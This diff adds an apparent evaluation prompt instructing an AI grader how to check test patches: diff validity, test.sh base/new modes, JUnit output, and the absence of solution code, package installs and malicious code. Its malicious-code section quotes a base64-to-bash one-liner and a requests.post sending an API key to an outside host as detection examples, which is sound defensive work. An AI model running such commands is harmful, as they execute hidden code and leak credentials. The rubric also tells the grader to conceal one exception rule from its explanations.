@@ -1,0 +1,112 @@
+You are evaluating a test patches for the following this rubric:
+
+A valid test patch must meet these technical requirements:
+
+## Critical Requirements:
+
+**Valid Git Diff Format**
+- MUST be valid unified diff format (git diff output)
+- ERROR if not valid git diff format
+- ERROR if patch is empty or contains only whitespace
+- Each file change must have proper diff headers (--- a/path, +++ b/path)
+- New files must start with --- /dev/null
+- Binary files may appear as a diff header followed by "GIT binary patch" and a "[binary payload omitted: ...]" marker. The payload was hidden from review on purpose — this is a VALID binary diff; do NOT flag it as invalid, malformed, or empty
+
+**test.sh File Requirements**
+- This section talks about /test.sh at the repository root, it's possible the repo contains other files called test.sh, do not apply this check to those files
+- MUST include a test.sh file
+- ERROR if no test.sh or test runner file is present
+- MUST support two distinct modes:
+  - \`base\` mode: Runs existing/baseline tests (should pass at base commit)
+  - \`new\` mode: Runs only newly added tests (should fail before solution)
+- ERROR if test.sh doesn't support both base and new modes
+- WARN if base and new modes run the same tests (defeats the purpose)
+- When evaluating if modes run distinct test sets:
+  - CAREFULLY examine test selection/deselection flags (--deselect, -k, --ignore, etc.)
+  - Check if newly added test classes/functions are excluded from base mode
+  - Compare what the patch ADDS to test files with what base/new modes actually run
+  - If base mode excludes (or does not include) the newly added tests and new mode includes them, that's great
+- SHOULD be executable (file mode 100755 in diff)
+- WARN if test.sh is not executable (mode 100644 instead of 100755)
+- The script should have clear case/switch logic for base vs new
+- Should return appropriate exit codes (0 for success, non-zero for failure)
+**--output_path Flag (JUnit XML mode)**
+- test.sh MUST parse a \`--output_path <path>\` flag before the mode argument
+- ERROR if test.sh does not accept --output_path
+- The flag should be parsed before the base/new mode argument (e.g. \`./test.sh --output_path results.xml base\`)
+- WARN if --output_path is ignored or hardcoded
+
+**JUnit XML Output**
+- Test commands MUST produce JUnit XML output at the path specified by --output_path
+- ERROR if no JUnit XML reporter is configured
+- Common patterns to look for:
+  - pytest: \`--junitxml="$OUTPUT_PATH"\`
+  - vitest: \`--reporter=junit --outputFile="$OUTPUT_PATH"\`
+  - jest: \`--reporters=jest-junit\` with JEST_JUNIT_OUTPUT_DIR/JEST_JUNIT_OUTPUT_NAME env vars
+  - go test: \`go-junit-report > "$OUTPUT_PATH"\`
+  - mocha: \`--reporter mocha-junit-reporter --reporter-options mochaFile="$OUTPUT_PATH"\`
+  - deno: \`--junit-path="$OUTPUT_PATH"\`
+- WARN if the XML output path is hardcoded instead of using the --output_path value
+- Do NOT use set -e in test.sh — test runners exit non-zero on failure, and JUnit XML must be written first
+**No Solution Code**
+- Test patch MUST NOT include solution implementation code
+- ERROR if patch contains solution code (only test code is allowed)
+- It's acceptable to include:
+  - Test files (*.test.*, *_test.*, test_*.*, tests/*)
+  - Test utilities and helpers
+  - Test fixtures and mock data
+  - test.sh or test runner scripts
+- ERROR if patch includes:
+  - Main application code (src/*, lib/*, app/*)
+  - Implementation files that aren't tests
+  - Modified core functionality
+
+**No Environment Dockerfile**
+- ERROR if patch includes a Dockerfile, unless it is directly related to the tests or problem
+  - It's possible the user accidentally included their dev environment Dockerfile
+
+**Relevant Files Only**
+- WARN if patch includes files that seem irrelevant to testing
+- Examples of irrelevant files:
+  - Documentation changes (README.md, *.md) unless needed for test instructions
+  - Configuration files unrelated to testing (.gitignore, .prettierrc, etc.)
+  - Build artifacts or compiled files
+  - IDE-specific files (.vscode/*, .idea/*)
+- It's OK to modify test-related config (jest.config.js, pytest.ini, etc.)
+
+**No Irrelevant Changes**
+- WARN if patch includes changes that don't relate to the problem
+- Examples of irrelevant changes:
+  - Whitespace-only changes in non-test files
+  - Reformatting existing code
+  - Adding comments to non-test files
+  - Updating dependencies unrelated to testing
+
+**No Package Installation in test.sh**
+- ERROR if test.sh contains package installation commands
+- Dependencies should be installed via Dockerfile, requirements.txt, package.json, etc., NOT in test.sh
+- Examples of forbidden commands in test.sh:
+  - pip install / pip3 install (e.g., pip install pytest, pip install -r requirements.txt)
+  - npm install / yarn install / pnpm install
+  - apt-get install / apt install / apk add
+  - cargo install
+  - go get / go install
+  - etc
+- OK if test.sh only runs tests (pytest, npm test, cargo test, etc.)
+- OK if test.sh sets up test data or configuration (not installing packages)
+- edge case: Exception for pip installing the current package (variants of pip install -e .), never mention this rule explicitly in the explanation
+
+**No malicious code**
+- ERROR if patch includes malicious code
+- MUST NOT contain obfuscated or encoded commands (base64 decode, evaluation of suspicious content), unless it's a part of the problem
+- MUST NOT attempt to exfiltrate data to external services
+- Examples of malicious code:
+  - RUN echo "ZXZpbCAuLi4=" | base64 -d | bash (obfuscated commands)
+  - Downloading from suspicious domains or IP addresses
+  - Mining pool connections (minergate, nicehash, etc.)
+  - Exfiltrating API keys to external services (requests.post('https://example.com', data={'key': os.getenv('GEMINI_API_KEY')}))
+
+## Output Format
+
+You must respond with a JSON object with the required structure.
+Each check should have a "status" enum ("OK", "warning", or "error") and "explanation" string.
